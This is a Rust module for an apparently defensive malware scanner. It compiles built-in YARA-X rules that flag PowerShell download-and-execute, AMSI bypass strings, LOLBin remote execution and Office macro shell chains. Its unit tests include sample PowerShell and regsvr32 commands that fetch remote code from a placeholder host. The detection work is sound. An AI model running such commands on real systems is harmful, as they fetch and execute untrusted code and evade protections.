use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use std::time::Duration;
use yara_x::{Compiler, Rules, Scanner};

const BUILTIN_RULES: &str = r#"
rule blackshard_harmless_self_test {
    strings:
        $v2 = "BLACKSHARD-HARMLESS-SELF-TEST-V2" ascii
    condition:
        $v2 at 0
}

rule blackshard_powershell_obfuscated_download_execute {
    strings:
        $ps1 = "powershell" ascii wide nocase
        $ps2 = "pwsh" ascii wide nocase
        $encode1 = "-EncodedCommand" ascii wide nocase
        $encode2 = "FromBase64String" ascii wide nocase
        $download1 = "DownloadString" ascii wide nocase
        $download2 = "Invoke-WebRequest" ascii wide nocase
        $download3 = "System.Net.WebClient" ascii wide nocase
        $execute1 = "Invoke-Expression" ascii wide nocase
        $execute2 = "IEX(" ascii wide nocase
    condition:
        1 of ($ps*) and 1 of ($encode*) and 1 of ($download*) and 1 of ($execute*)
}

rule blackshard_powershell_amsi_bypass_sequence {
    strings:
        $amsi1 = "AmsiScanBuffer" ascii wide nocase
        $amsi2 = "amsiInitFailed" ascii wide nocase
        $amsi3 = "System.Management.Automation.AmsiUtils" ascii wide nocase
        $tamper1 = "VirtualProtect" ascii wide nocase
        $tamper2 = "GetProcAddress" ascii wide nocase
        $reflect = "GetField" ascii wide nocase
    condition:
        2 of ($amsi*) and 1 of ($tamper*) and $reflect
}

rule blackshard_lolbin_remote_execution_command {
    strings:
        $certutil = /certutil(\.exe)?\s+[^\r\n]{0,100}-urlcache/ ascii nocase
        $mshta = /mshta(\.exe)?\s+(https?:|javascript:|vbscript:)/ ascii nocase
        $regsvr = /regsvr32(\.exe)?\s+[^\r\n]{0,160}\/i:https?:/ ascii nocase
    condition:
        any of them
}

rule blackshard_lolbin_transfer_or_decode {
    strings:
        $certutil = /certutil(\.exe)?\s+[^\r\n]{0,100}-decode/ ascii nocase
        $bitsadmin = /bitsadmin(\.exe)?\s+[^\r\n]{0,100}\/transfer/ ascii nocase
    condition:
        any of them
}

rule blackshard_office_macro_autoexec_shell_chain {
    strings:
        $auto1 = "AutoOpen" ascii wide nocase
        $auto2 = "Document_Open" ascii wide nocase
        $auto3 = "Workbook_Open" ascii wide nocase
        $shell1 = "WScript.Shell" ascii wide nocase
        $shell2 = "ShellExecute" ascii wide nocase
        $shell3 = "CreateObject" ascii wide nocase
        $payload1 = "powershell" ascii wide nocase
        $payload2 = "mshta" ascii wide nocase
        $payload3 = "rundll32" ascii wide nocase
    condition:
        1 of ($auto*) and 1 of ($shell*) and 1 of ($payload*)
}
"#;

#[derive(Debug, Clone, Copy, Serialize, Deserialize, PartialEq, Eq)]
#[serde(rename_all = "snake_case")]
pub enum RuleDisposition {
    Informational,
    Suspicious,
    Malicious,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RuleProvenance {
    EmbeddedTrustedTest,
    EmbeddedHeuristic,
    PublisherAuthenticated,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum RuleEnforcementAuthority {
    AlertOnly,
    ExecutionDeny,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RulePolicy {
    pub identifier: String,
    pub disposition: RuleDisposition,
    pub risk_score: u8,
    pub threat_name: String,
    pub description: String,
}

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct RuleBundle {
    pub namespace: String,
    pub source: String,
    pub policies: Vec<RulePolicy>,
}

#[derive(Debug, Clone)]
pub struct RuleMatch {
    pub identifier: String,
    pub namespace: String,
    pub disposition: RuleDisposition,
    pub risk_score: u8,
    pub threat_name: String,
    pub description: String,
    pub provenance: RuleProvenance,
    pub enforcement_authority: RuleEnforcementAuthority,
}

#[derive(Clone)]
pub struct RuleEngine {
    rules: Arc<Rules>,
    policies: Arc<HashMap<String, RulePolicy>>,
}

impl RuleEngine {
    pub fn builtin() -> Result<Self, String> {
        Self::compile(&[])
    }

    pub fn compile(authenticated_bundles: &[RuleBundle]) -> Result<Self, String> {
        let mut compiler = Compiler::new();
        compiler.new_namespace("blackshard_builtin");
        compiler
            .add_source(BUILTIN_RULES)
            .map_err(|error| format!("built-in rule compilation failed: {error}"))?;

        let mut policies = builtin_policies();
        for bundle in authenticated_bundles {
            validate_namespace(&bundle.namespace)?;
            compiler.new_namespace(&bundle.namespace);
            compiler
                .add_source(bundle.source.as_str())
                .map_err(|error| {
                    format!("rule bundle {} did not compile: {error}", bundle.namespace)
                })?;
            for policy in &bundle.policies {
                let mut policy = policy.clone();
                policy.risk_score = policy.risk_score.min(100);
                policies.insert(policy_key(&bundle.namespace, &policy.identifier), policy);
            }
        }

        Ok(Self {
            rules: Arc::new(compiler.build()),
            policies: Arc::new(policies),
        })
    }

    pub fn scan(&self, bytes: &[u8]) -> Result<Vec<RuleMatch>, String> {
        let mut scanner = Scanner::new(&self.rules);
        scanner
            .set_timeout(Duration::from_millis(250))
            .max_matches_per_pattern(32)
            .fast_scan(true);
        let results = scanner
            .scan(bytes)
            .map_err(|error| format!("YARA-X scan failed: {error}"))?;

        let mut matches = Vec::new();
        for matched in results.matching_rules() {
            let identifier = matched.identifier().to_owned();
            let namespace = matched.namespace().to_owned();
            let policy = self
                .policies
                .get(&policy_key(&namespace, &identifier))
                .cloned()
                .unwrap_or_else(|| RulePolicy {
                    identifier: identifier.clone(),
                    disposition: RuleDisposition::Suspicious,
                    risk_score: 25,
                    threat_name: format!("YARA.{identifier}"),
                    description:
                        "authenticated rule matched without an explicit enforcement policy"
                            .to_owned(),
                });
            let provenance = provenance_for(&namespace, &identifier);
            let enforcement_authority = enforcement_authority_for(&namespace, &identifier);
            matches.push(RuleMatch {
                identifier,
                namespace,
                disposition: policy.disposition,
                risk_score: policy.risk_score,
                threat_name: policy.threat_name,
                description: policy.description,
                provenance,
                enforcement_authority,
            });
        }
        Ok(matches)
    }
}

fn provenance_for(namespace: &str, identifier: &str) -> RuleProvenance {
    if namespace != "blackshard_builtin" {
        RuleProvenance::PublisherAuthenticated
    } else if identifier == "blackshard_harmless_self_test" {
        RuleProvenance::EmbeddedTrustedTest
    } else {
        RuleProvenance::EmbeddedHeuristic
    }
}

fn enforcement_authority_for(namespace: &str, identifier: &str) -> RuleEnforcementAuthority {
    if namespace == "blackshard_builtin" && identifier == "blackshard_harmless_self_test" {
        RuleEnforcementAuthority::ExecutionDeny
    } else {
        RuleEnforcementAuthority::AlertOnly
    }
}

fn builtin_policies() -> HashMap<String, RulePolicy> {
    let entries = [
        (
            "blackshard_harmless_self_test",
            RuleDisposition::Malicious,
            100,
            "blackshard-self-test",
            "matched the internal blackshard harmless protection test payload",
        ),
        (
            "blackshard_powershell_obfuscated_download_execute",
            RuleDisposition::Suspicious,
            45,
            "Suspicious.PowerShell.DownloadExecute",
            "combined obfuscation, download, and in-memory execution indicators",
        ),
        (
            "blackshard_powershell_amsi_bypass_sequence",
            RuleDisposition::Suspicious,
            55,
            "Suspicious.PowerShell.AMSIBypass",
            "multiple AMSI tampering indicators appeared in one payload",
        ),
        (
            "blackshard_lolbin_remote_execution_command",
            RuleDisposition::Suspicious,
            40,
            "Suspicious.LOLBin.RemoteExecution",
            "a Windows utility was configured to retrieve or execute remote content",
        ),
        (
            "blackshard_lolbin_transfer_or_decode",
            RuleDisposition::Suspicious,
            30,
            "Suspicious.LOLBin.TransferOrDecode",
            "a Windows utility was configured to transfer or decode a file",
        ),
        (
            "blackshard_office_macro_autoexec_shell_chain",
            RuleDisposition::Suspicious,
            45,
            "Suspicious.Office.AutoExecShell",
            "macro auto-execution and shell payload indicators were combined",
        ),
    ];

    entries
        .into_iter()
        .map(
            |(identifier, disposition, risk_score, threat_name, description)| {
                let policy = RulePolicy {
                    identifier: identifier.to_owned(),
                    disposition,
                    risk_score,
                    threat_name: threat_name.to_owned(),
                    description: description.to_owned(),
                };
                (policy_key("blackshard_builtin", identifier), policy)
            },
        )
        .collect()
}

fn policy_key(namespace: &str, identifier: &str) -> String {
    format!("{namespace}\0{identifier}")
}

fn validate_namespace(namespace: &str) -> Result<(), String> {
    if namespace.is_empty()
        || namespace.len() > 64
        || !namespace
            .bytes()
            .all(|byte| byte.is_ascii_alphanumeric() || byte == b'_' || byte == b'-')
    {
        return Err(format!("invalid rule namespace: {namespace:?}"));
    }
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn harmless_self_test_rule_is_high_confidence_malicious() {
        let engine = RuleEngine::builtin().unwrap();
        let matches = engine.scan(crate::self_test::PAYLOAD).unwrap();
        assert_eq!(matches.len(), 1);
        assert_eq!(matches[0].disposition, RuleDisposition::Malicious);
        assert_eq!(matches[0].risk_score, 100);
        assert_eq!(
            matches[0].enforcement_authority,
            RuleEnforcementAuthority::ExecutionDeny
        );
    }

    #[test]
    fn suspicious_script_rule_does_not_claim_malicious() {
        let engine = RuleEngine::builtin().unwrap();
        let matches = engine
            .scan(
                b"powershell -EncodedCommand AAA; $x=[Convert]::FromBase64String('AA=='); \
                  (New-Object System.Net.WebClient).DownloadString('https://example.invalid'); \
                  Invoke-Expression $x",
            )
            .unwrap();
        assert!(matches.iter().any(|item| {
            item.identifier == "blackshard_powershell_obfuscated_download_execute"
                && item.disposition == RuleDisposition::Suspicious
        }));
        assert!(!matches
            .iter()
            .any(|item| item.disposition == RuleDisposition::Malicious));
    }

    #[test]
    fn ordinary_text_has_no_matches() {
        let engine = RuleEngine::builtin().unwrap();
        assert!(engine
            .scan(b"This is an ordinary blackshard project document.")
            .unwrap()
            .is_empty());
    }

    #[test]
    fn invalid_bundle_namespace_is_rejected() {
        let bundle = RuleBundle {
            namespace: "bad namespace".to_owned(),
            source: "rule okay { condition: false }".to_owned(),
            policies: Vec::new(),
        };
        assert!(RuleEngine::compile(&[bundle]).is_err());
    }

    #[test]
    fn authenticated_publisher_rule_is_alert_only_even_when_malicious() {
        let bundle = RuleBundle {
            namespace: "publisher".to_owned(),
            source: "rule external_malicious { condition: true }".to_owned(),
            policies: vec![RulePolicy {
                identifier: "external_malicious".to_owned(),
                disposition: RuleDisposition::Malicious,
                risk_score: 100,
                threat_name: "Publisher.Test".to_owned(),
                description: "test".to_owned(),
            }],
        };
        let matched = RuleEngine::compile(&[bundle]).unwrap().scan(b"x").unwrap();
        assert_eq!(
            matched[0].provenance,
            RuleProvenance::PublisherAuthenticated
        );
        assert_eq!(
            matched[0].enforcement_authority,
            RuleEnforcementAuthority::AlertOnly
        );
    }

    #[test]
    fn remote_execution_and_admin_transfers_are_separate_rules() {
        let engine = RuleEngine::builtin().unwrap();
        let identifiers = |bytes: &[u8]| {
            engine
                .scan(bytes)
                .unwrap()
                .into_iter()
                .map(|matched| matched.identifier)
                .collect::<Vec<_>>()
        };
        assert_eq!(
            identifiers(b"regsvr32 /s /n /u /i:https://example.invalid/x.sct scrobj.dll"),
            ["blackshard_lolbin_remote_execution_command"]
        );
        assert_eq!(
            identifiers(b"certutil -decode cert.b64 cert.cer"),
            ["blackshard_lolbin_transfer_or_decode"]
        );
    }
}
